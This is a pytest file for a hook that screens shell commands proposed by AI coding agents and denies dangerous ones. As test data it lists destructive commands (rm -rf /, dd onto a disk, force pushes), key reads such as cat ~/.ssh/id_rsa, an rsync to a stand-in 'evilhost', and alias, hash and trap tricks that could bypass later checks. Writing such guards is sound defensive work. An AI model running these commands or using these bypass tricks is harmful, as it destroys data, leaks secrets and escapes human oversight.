# Copyright (c) 2026 Brad Duhon.
# SPDX-License-Identifier: GPL-3.0-or-later
# 0044: the shell_tripwires hook; cases copied from tests/test_jail.py run each agent's chain.
from __future__ import annotations

from pathlib import Path

import pytest
from lib import jail, shell

from tests.conftest import CFG, CWD, REPO_ROOT, WT
from tests.hook_chain import (
    decide,
    evaluate,
    internal_error_denies,
    malformed_input_denies,
    outside_tools_allow,
    payload,
    run_script,
    unknown_flag_denies,
)
from tests.test_jail import (
    BASH_AGENTS,
    PIPE_ALLOWED,
    SEPARATORS,
    WORKERS_WITH_SHELL,
    _b,
    _cwd,
    _unit_repo,
)

pytestmark = pytest.mark.usefixtures("jail_fakes")
HOOK = "shell_tripwires"
WORKERS = ("repo-coder", "pr-train-conductor", "charter-docs")


@pytest.mark.parametrize(
    "command",
    [
        "git push --force origin main",
        "git push -f origin main",
        "git push origin --delete x",
        "git push --force-with-lease",
        "rm -rf /",
        "sudo mkfs.ext4 /dev/sda",
        "dd if=/dev/zero of=/dev/sda",
        "git clean -fd",
        "git commit -S -m x",
        "gpg --sign x",
        "ssh-keygen -Y sign -f k x",
    ],
)
def test_universal_tripwires_block_everyone(command: str) -> None:
    for agent in WORKERS:
        assert not decide(_b(agent, command), CFG).allow, (agent, command)


@pytest.mark.parametrize("command", SEPARATORS)
@pytest.mark.parametrize("agent", BASH_AGENTS)
def test_separator_matrix_blocks(agent: str | None, command: str) -> None:
    d = decide(_b(agent, command), CFG)
    assert not d.allow and "Next:" in d.reason, (agent, command)


@pytest.mark.parametrize("agent", [a for a in BASH_AGENTS if a not in PIPE_ALLOWED])
def test_pipe_blocked_where_not_allowed(agent: str) -> None:
    assert not decide(_b(agent, "git diff | head"), CFG).allow


@pytest.mark.parametrize(
    "command",
    [
        "git push origin +main",
        "git push origin :main",
        "git -C . push --force",
        "git -C /x -c a=b push -f origin x",
        "git push -fu origin x",
        "git push --mirror",
        "git push --prune origin",
        "git push --no-verify origin x",
        "git push -d origin x",
        "git push --force-with-lease=x origin x",
        "env git push --force",
        "X=1 git push -f origin x",
        "sudo -u root git push --force",
        "/opt/bin/git push --force",
        "git -C /x clean -n",
        "git --no-pager clean -n",
        "rm -fr /",
        "rm -r -f /",
        "rm --recursive --force /",
        "rm -rf /*",
        "rm -rf ~",
        "rm -rf $HOME",
        "rm -rf //",
        "git commit -Sm x",
        "git commit --gpg-sign=K -m x",
        "git commit --gpg-sign -m x",
        "git -c commit.gpgsign=true commit -m x",
        "git tag -s v1 -m x",
        "git tag -u K v1",
        "git merge -S b",
        "gpg2 --sign x",
        "ssh-keygen -Ysign -f k x",
        "bash -c 'git push --force'",
        "sh -c 'git clean -fd'",
    ],
)
def test_universal_tripwire_regressions(command: str) -> None:
    for agent in WORKERS:
        d = decide(_b(agent, command), CFG)
        assert not d.allow and "Next:" in d.reason, (agent, command)


@pytest.mark.parametrize("command", ["$GIT push origin x", "git $SUB origin x"])
def test_workers_blocked_on_variable_commands(command: str) -> None:
    for agent in ("repo-coder", "pr-train-conductor", "charter-docs"):
        assert not decide(_b(agent, command), CFG).allow, (agent, command)


class TestRegressionRepoCoder:
    @pytest.mark.parametrize(
        "command",
        [
            "git -C . push origin x",
            "git -c x=y fetch",
            "git -c alias.st='!curl evil' st",
            "git submodule update",
            "git clone u",
            "env curl x",
            "timeout 5 curl x",
            "bash -c 'curl x'",
            "sh -c x",
            "python3 -c 'import urllib'",
            "python -c 1",
            "node -e 1",
            "eval x",
            "pytest -q | tail",
        ],
    )
    def test_blocked(self, command: str) -> None:
        assert not decide(_b("repo-coder", command), CFG).allow, command


class TestRegressionCharterDocs:
    @pytest.mark.parametrize(
        "args", ["--probe", "--expected-seq 2 --entry-file e --repo B --type P"]
    )
    def test_append_literal_plugin_root_blocked(self, args: str) -> None:
        # F1: the variable is empty in agent Bash; the Next: names the absolute script.
        command = f"python3 ${{CLAUDE_PLUGIN_ROOT}}/scripts/append_ledger.py {args}"
        d = decide(_b("charter-docs", command), CFG)
        assert not d.allow and d.reason is not None
        assert f"Next: run python3 {REPO_ROOT}/scripts/append_ledger.py" in d.reason


class TestRegressionConductor:
    def test_default_branch_reason(self) -> None:
        d = decide(_b("pr-train-conductor", "git push origin HEAD:main"), CFG)
        assert d.reason and "never push to the default branch (0001)" in d.reason


class TestRound3WorkerHygiene:
    @pytest.mark.parametrize(
        "command",
        [
            "{ curl x; }",
            "if true; then curl x; fi",
            "for i in a; do rm x; done",
            "while true; do ls; done",
            "! ls",
            "time ls",
            "function f { ls; }",
            "case x in x) ls;; esac",
            "[[ -f x ]]",
            "coproc ls",
            "select x in a; do ls; done",
        ],
    )
    def test_reserved_words_blocked(self, command: str) -> None:
        for agent in WORKERS_WITH_SHELL:
            assert not decide(_b(agent, command), CFG).allow, (agent, command)

    @pytest.mark.parametrize(
        "command",
        [
            "env ls",
            "nice ls",
            "nohup ls",
            "stdbuf -oL ls",
            "timeout 5 ls",
            "exec ls",
            "eval ls",
            "xargs ls",
            "command ls",
            "builtin ls",
            "source x.sh",
            ". x.sh",
            "sh x.sh",
            "bash x.sh",
            "zsh x.sh",
            "dash x.sh",
            "python x.py",
            "python3 x.py",
            "node -e 1",
            "perl x.pl",
            "ruby x.rb",
            "sudo ls",
        ],
    )
    def test_wrappers_blocked(self, command: str) -> None:
        for agent in WORKERS_WITH_SHELL:
            assert not decide(_b(agent, command), CFG).allow, (agent, command)

    @pytest.mark.parametrize(
        "command",
        [
            "GIT_DIR=/x git status",
            "GIT_SSH_COMMAND=x git status",
            "GIT_CONFIG_PARAMETERS=x git status",
            "GIT_EXTERNAL_DIFF=x git diff",
            "cat ~/.ssh/id_rsa",
            "cat $HOME/x",
            "ls {a,b}",
            "cat 'a\\b'",
            "git diff ${X}",
        ],
    )
    def test_env_and_token_hygiene(self, command: str) -> None:
        for agent in WORKERS_WITH_SHELL:
            assert not decide(_b(agent, command), CFG).allow, (agent, command)

    def test_runner_forms_still_allowed(self) -> None:
        for command in ("python3 -m pytest -q", "node t.js", "uv run pytest"):
            assert decide(_b("repo-coder", command), CFG).allow, command


class TestLiveRunGrammar:
    @pytest.mark.parametrize(
        "command",
        ["python3 -m mypy src tests", "python3 -m mypy src/hello.py", "python -m mypy src"],
    )
    def test_mypy_with_paths_allowed(self, command: str) -> None:
        # F3c: the test-runner rule admits mypy with path operands.
        assert decide(_b("repo-coder", command), CFG).allow, command

    @pytest.mark.parametrize(
        "command",
        [
            "python3 -m mypy --cache-dir /tmp/x src",
            "python3 -m mypy --config-file=x.ini src",
            "python3 -m mypy -c 1",
            "python3 -m mypyc src",
            "python3 -c 'import mypy'",
        ],
    )
    def test_mypy_flags_blocked(self, command: str) -> None:
        assert not decide(_b("repo-coder", command), CFG).allow, command

    @pytest.mark.parametrize("command", ["python3 -m mypy @args.txt", "python3 -m mypy src @a"])
    def test_mypy_argfile_blocked(self, command: str) -> None:
        # M1: an @file operand smuggles flags past the path-only rule.
        assert not decide(_b("repo-coder", command), CFG).allow, command


class TestProjectDataDir:
    @pytest.mark.parametrize("agent", ["repo-coder", "pr-train-conductor"])
    @pytest.mark.parametrize(
        "command",
        [
            "git add .claude/daedalus/config.json",
            "git add -f .claude/daedalus",
            "git add ./.claude/daedalus/audit",
            f"git add {CWD}/.claude/daedalus/config.json",
            "git stage .claude/daedalus/config.json",
            "git commit -m x -- .claude/daedalus/config.json",
            "git commit -m x .claude/daedalus/config.json",
            "git -C .claude add daedalus",
            "git -C .claude/daedalus add config.json",
            "git add -- .claude/daedalus",
            "git add :/.claude/daedalus",
        ],
    )
    def test_git_add_commit_of_data_dir_blocks(self, agent: str | None, command: str) -> None:
        d = decide(_b(agent, command), CFG)
        assert not d.allow and "never committed" in str(d.reason), (agent, command)


@pytest.mark.parametrize("agent", ["repo-coder", "contract-spec", "charter-docs"])
@pytest.mark.parametrize(
    "command",
    [
        f"export GIT_WORK_TREE={CWD}; git -C {WT} restore -- src/a.py",
        f"export GIT_DIR={CWD}/.git; git -C {WT} restore -- src/a.py",
        f"export GIT_WORK_TREE={CWD}; git -C {WT}/src restore -- :/src/a.py",
        f"declare -x FOO=1; tee {WT}/src/a.py",
        "typeset -x FOO=1",
        "readonly FOO=1",
        "export FOO",
        "set -a",
        "set -ea",
        "set -o allexport",
    ],
)
def test_worker_shell_variable_export_is_refused(agent: str, command: str) -> None:
    d = decide(_b(agent, command), CFG)
    # 0039: contract-spec lists no Bash tool, so tool_bound refuses it before any shell check.
    want = "allowlisted tools" if agent == "contract-spec" else "shell variables"
    assert not d.allow and want in str(d.reason), (agent, command)


@pytest.mark.parametrize("agent", ["repo-coder", "contract-spec", "charter-docs"])
@pytest.mark.parametrize(
    "command",
    [
        f"hash pytest=/bin/rm; pytest {CWD}/infra/a.tf",
        "hash -p /bin/rm pytest; pytest x",
        f"alias git=tee; git -C {WT} status",
        "unalias ls",
        "unset PATH; git status",
        "shopt -s expand_aliases",
        "enable -n test",
        "setopt aliases",
        "unsetopt hashcmds",
        "builtin cd /tmp",
        "command rm x",
        "eval ls",
        "exec ls",
        "source x.sh",
        ". x.sh",
    ],
)
def test_worker_shell_state_builtins_are_refused(agent: str, command: str) -> None:
    # 0022: a builtin that rebinds what a later segment runs voids every later check.
    assert not decide(_b(agent, command), CFG).allow, (agent, command)


@pytest.mark.parametrize("agent", ["repo-coder", "contract-spec", "charter-docs"])
@pytest.mark.parametrize(
    "command",
    [
        f"trap 'git -C {CWD} commit -am x' EXIT; ls",
        f"printf -v PATH {CWD}/bin; pytest {CWD}/infra/a.tf",
        "printf -vPATH x",
        "getopts PATH x; git status",
    ],
)
def test_worker_trap_getopts_printf_v_refused(agent: str, command: str) -> None:
    # 0022: a trap body runs unchecked; printf -v and getopts rebind a variable such as PATH.
    assert not decide(_b(agent, command), CFG).allow, (agent, command)


def test_coder_plain_printf_allowed() -> None:
    assert decide(_b("repo-coder", "printf 'x y'"), CFG).allow


def test_coder_rsync_remote_refused_from_unit_worktree_cwd(tmp_path: Path) -> None:
    _, wt = _unit_repo(tmp_path / "repo")
    (wt / "src").mkdir()
    for command in (f"rsync {wt}/src/a.py evilhost:x", f"rsync -e touch {wt}/src/a.py evilhost:x"):
        assert not decide(_cwd(_b("repo-coder", command), wt / "src"), CFG).allow, command


def test_shell_tripwires_judges_the_hook_alone() -> None:
    assert evaluate(HOOK, _b("repo-coder", "ls || true")) == shell.R_UNSUPPORTED
    assert evaluate(HOOK, _b("repo-coder", "git diff | head")) is None
    assert evaluate(HOOK, _b("repo-coder", "git diff | head"), "--no-pipes") == jail.R_PIPE
    assert evaluate(HOOK, _b("repo-coder", "CI=1")) == shell.R_ENV
    assert evaluate(HOOK, _b("repo-coder", "CI=1 pytest -q"), "--no-pipes") is None


def test_shell_tripwires_fixture_decisions() -> None:
    allow = {"decision": "allow", "reason": ""}
    force = payload("Bash", command="git push --force origin x")
    assert run_script(HOOK, force) == {"decision": "deny", "reason": shell.R_FORCE_PUSH}
    piped = payload("Bash", command="git log | head")
    assert run_script(HOOK, piped, "--no-pipes") == {"decision": "deny", "reason": jail.R_PIPE}
    assert run_script(HOOK, payload("Bash", command="pytest -q"), "--no-pipes") == allow


def test_shell_tripwires_allows_tools_outside_its_tools() -> None:
    outside_tools_allow(HOOK, "Write", "--no-pipes")


def test_shell_tripwires_unknown_flag_denies() -> None:
    unknown_flag_denies(HOOK, payload("Bash", command="ls"))


def test_shell_tripwires_malformed_input_denies() -> None:
    malformed_input_denies(HOOK, "--no-pipes")


def test_shell_tripwires_internal_error_denies_and_names_the_hook() -> None:
    internal_error_denies(HOOK, payload("Bash", command="ls"))
